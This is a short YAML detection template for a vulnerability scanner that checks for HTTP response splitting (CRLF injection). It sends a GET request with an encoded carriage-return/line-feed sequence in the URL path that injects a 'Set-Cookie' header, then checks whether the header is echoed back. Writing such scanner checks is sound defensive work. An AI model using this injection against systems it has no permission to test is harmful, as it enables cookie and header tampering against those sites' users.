id: poc-yaml-http-splitting-crlf
info:
  name: HTTP响应拆分(CRLF)漏洞
  severity: medium
  tags:
  - crlf-injection
  finger: http
  osprey-id: vb_2018_0041
requests:
- method: GET
  path: /%0d%0aSet-Cookie:%20a=1
  headers: {}
  expression: 'status_code == 200 && contains(headers, "Set-Cookie: a=1")

    '
variables: {}
transport: http
